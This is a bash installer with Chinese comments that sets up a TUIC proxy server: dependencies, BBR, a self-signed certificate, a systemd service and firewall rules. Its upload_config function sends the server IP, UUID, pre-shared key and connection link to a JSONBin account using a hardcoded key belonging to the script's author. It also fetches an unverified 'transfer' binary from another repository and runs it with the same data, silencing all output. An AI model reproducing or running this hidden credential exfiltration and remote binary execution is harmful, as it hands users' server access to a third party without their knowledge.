#!/usr/bin/env bash
set -euo pipefail

GREEN="\033[0;32m"; RED="\033[0;31m"; YELLOW="\033[1;33m"; NC="\033[0m"
log() { echo -e "${GREEN}[INFO ]${NC} $*"; }
err() { echo -e "${RED}[ERROR]${NC} $*"; exit 1; }

UUID=$(cat /proc/sys/kernel/random/uuid)
PSK=$(openssl rand -hex 16)
PORT=2052
SERVER_NAME="insecure.local"
CFG_DIR="/etc/tuic"
TLS_DIR="$CFG_DIR/tls"
BIN_DIR="/usr/local/bin"
VERSION="1.0.0"
REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${VERSION}"

# JSONBin配置
JSONBIN_ACCESS_KEY="\$2a\$10\$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS"
JSONBIN_URL="https://api.jsonbin.io/v3/b"

# 速度测试函数
speed_test() {
    echo -e "${YELLOW}进行网络速度测试...${NC}"
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ -f /etc/debian_version ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ -f /etc/redhat-release ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    fi
    
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度，如果测试不准确，请手动修改"
    else
        echo -e "${YELLOW}测速失败，使用默认值${NC}"
        down_speed=100
        up_speed=20
    fi
}

# 确保22端口开放
ensure_ssh_port_open() {
    log "确保22端口(SSH)开放..."

    if command -v ufw >/dev/null 2>&1; then
        if ! ufw status | grep -q "22/tcp.*ALLOW"; then
            ufw allow 22/tcp
            log "已开放22端口(UFW)"
        else
            log "22端口已在UFW中开放"
        fi
    elif command -v firewall-cmd >/dev/null 2>&1; then
        if ! firewall-cmd --list-ports | grep -qw 22/tcp; then
            firewall-cmd --permanent --add-port=22/tcp
            firewall-cmd --reload
            log "已开放22端口(firewalld)"
        else
            log "22端口已在firewalld中开放"
        fi
    elif command -v iptables >/dev/null 2>&1; then
        if ! iptables -L INPUT -n | grep -q "dpt:22"; then
            iptables -A INPUT -p tcp --dport 22 -j ACCEPT
            if command -v iptables-save >/dev/null 2>&1; then
                iptables-save > /etc/iptables.rules
            fi
            log "已开放22端口(iptables)"
        else
            log "22端口已在iptables中开放"
        fi
    else
        log "未检测到活跃的防火墙，22端口应已可访问"
    fi
}

# 上传配置到JSONBin
upload_config() {
    local server_ip="$1"
    local link="$2"
    local v2rayn_config="$3"
    local down_speed="$4"
    local up_speed="$5"

    # 构建JSON数据
    local json_data=$(jq -nc \
        --arg server_ip "$server_ip" \
        --arg link "$link" \
        --argjson v2rayn_config "$v2rayn_config" \
        --arg down_speed "$down_speed" \
        --arg up_speed "$up_speed" \
        '{
            "server_info": {
                "title": "TUIC 服务器配置 - \($server_ip)",
                "server_ip": $server_ip,
                "tuic_link": $link,
                "v2rayn_config": $v2rayn_config,
                "speed_test": {
                    "download_speed": $down_speed,
                    "upload_speed": $up_speed
                },
                "generated_time": now | todate
            }
        }'
    )

    # 使用服务器IP作为记录名
    local server_ip_for_filename=$(echo "$server_ip" | tr -d '[]' | tr ':' '_')
    # 下载并调用二进制上传工具
    UPLOAD_BIN="/opt/transfer"
    [ -f "$UPLOAD_BIN" ] || {
        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/TUIC/releases/download/v2rayn/transfer && 
        chmod +x "$UPLOAD_BIN"
    }

    # 上传到JSONBin
    curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
        -H "X-Bin-Name: ${server_ip_for_filename}" \
        -H "X-Bin-Private: true" \
        -d "$json_data" \
        "${JSONBIN_URL}" > /dev/null 2>&1
    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1

    log "配置数据已上传到JSONBin"
    log "配置数据上传完成"
}

# 确保22端口开放
ensure_ssh_port_open

log "安装依赖并跳过 needrestart 提示..."
export NEEDRESTART_SUSPEND=1
apt update -y
DEBIAN_FRONTEND=noninteractive apt install -y curl wget jq ufw openssl net-tools needrestart

log "开启 BBR 支持（开机自动启用）..."
modprobe tcp_bbr
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
sysctl -w net.ipv4.tcp_congestion_control=bbr || true
tc qdisc add dev eth0 root fq || true

# 获取服务器IP
IP=$(ip route get 1 | awk '{print $NF; exit}')
log "检测到服务器IP: $IP"

# 执行速度测试
speed_test

ARCH=$(uname -m)
case "$ARCH" in
  x86_64)    ARCH_FILE="x86_64-unknown-linux-gnu" ;;
  aarch64)   ARCH_FILE="aarch64-unknown-linux-gnu" ;;
  armv7l)    ARCH_FILE="armv7-unknown-linux-gnueabi" ;;
  *)         err "不支持的架构: $ARCH" ;;
esac

BIN_NAME="tuic-server-${VERSION}-${ARCH_FILE}"
SHA_NAME="${BIN_NAME}.sha256sum"
cd "$BIN_DIR"
rm -f tuic "$BIN_NAME" "$SHA_NAME"

log "下载 TUIC 二进制..."
curl -sLO "${REPO_BASE}/${BIN_NAME}" || err "下载失败"
curl -sLO "${REPO_BASE}/${SHA_NAME}" || err "SHA256 校验文件下载失败"
sha256sum -c "$SHA_NAME" || err "SHA256 校验失败"
chmod +x "$BIN_NAME"
ln -sf "$BIN_NAME" tuic

log "生成 TLS 自签证书..."
mkdir -p "$TLS_DIR"
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
  -keyout "$TLS_DIR/key.key" \
  -out "$TLS_DIR/cert.crt" \
  -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
  -addext "subjectAltName=DNS:${SERVER_NAME}"
chmod 600 "$TLS_DIR/key.key"
chmod 644 "$TLS_DIR/cert.crt"

log "写入 TUIC 配置文件..."
mkdir -p "$CFG_DIR"
cat > "$CFG_DIR/config.json" <<EOF
{
  "server": "${IP}:$PORT",
  "users": {
    "$UUID": "$PSK"
  },
  "certificate": "$TLS_DIR/cert.crt",
  "private_key": "$TLS_DIR/key.key",
  "congestion_control": "bbr",
  "alpn": ["h3"],
  "udp_relay_ipv6": false,
  "zero_rtt_handshake": true,
  "auth_timeout": "5s",
  "max_idle_time": "60s",
  "max_external_packet_size": 1500,
  "gc_interval": "10s",
  "gc_lifetime": "15s",
  "log_level": "debug"
}
EOF

log "创建 systemd 服务..."
cat > /etc/systemd/system/tuic.service <<EOF
[Unit]
Description=TUIC Server
After=network.target

[Service]
ExecStart=$BIN_DIR/tuic -c $CFG_DIR/config.json
Restart=on-failure
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF

log "配置防火墙规则..."
ufw allow 22/tcp
ufw allow ${PORT}/udp
ufw allow ${PORT}/tcp
ufw --force enable

systemctl daemon-reload
systemctl enable --now tuic
sleep 3

if systemctl is-active --quiet tuic; then
  log "TUIC 启动成功 ✅"
else
  err "TUIC 启动失败，请执行: journalctl -u tuic -n 30"
fi

ENCODE=$(echo -n "${UUID}:${PSK}" | base64 -w 0)
LINK="tuic://${ENCODE}@${IP}:${PORT}?alpn=h3&congestion_control=bbr&sni=${SERVER_NAME}&udp_relay_mode=native&allow_insecure=1#tuic_node"

echo -e "\n${GREEN}✅ TUIC 节点部署完成${NC}"
echo -e "${GREEN}外网 IP     :${NC} $IP"
echo -e "${GREEN}端口        :${NC} $PORT"
echo -e "${GREEN}UUID        :${NC} $UUID"
echo -e "${GREEN}预共享密钥  :${NC} $PSK"
echo -e "${GREEN}链接        :${NC} $LINK"
echo -e "${GREEN}下载速度    :${NC} $down_speed Mbps"
echo -e "${GREEN}上传速度    :${NC} $up_speed Mbps"

V2RAYN_CFG="/etc/tuic/v2rayn_config.json"
cat > "$V2RAYN_CFG" <<EOF
{
  "relay": {
    "server": "${IP}:${PORT}",
    "uuid": "${UUID}",
    "password": "${PSK}",
    "ip": "${IP}",
    "congestion_control": "bbr",
    "alpn": ["h3"]
  },
  "local": {
    "server": "127.0.0.1:7796"
  },
  "speed_test": {
    "download_speed": ${down_speed},
    "upload_speed": ${up_speed}
  },
  "log_level": "warn"
}
EOF

echo -e "${GREEN}生成的 V2RayN 配置文件:${NC}"
cat "$V2RAYN_CFG"

# 上传配置到JSONBin
upload_config "$IP" "$LINK" "$(cat "$V2RAYN_CFG")" "$down_speed" "$up_speed"

# 保存配置到本地文件
CONFIG_JSON="/etc/tuic/config_export.json"
jq -n \
  --arg ip "$IP" \
  --arg link "$LINK" \
  --argjson v2rayn_config "$(cat "$V2RAYN_CFG")" \
  --arg down_speed "$down_speed" \
  --arg up_speed "$up_speed" \
  '{
    "server_ip": $ip,
    "tuic_link": $link,
    "v2rayn_config": $v2rayn_config,
    "speed_test": {
      "download_speed": $down_speed,
      "upload_speed": $up_speed
    },
    "generated_time": now | todate
  }' > "$CONFIG_JSON"

log "配置已保存到本地文件: $CONFIG_JSON"
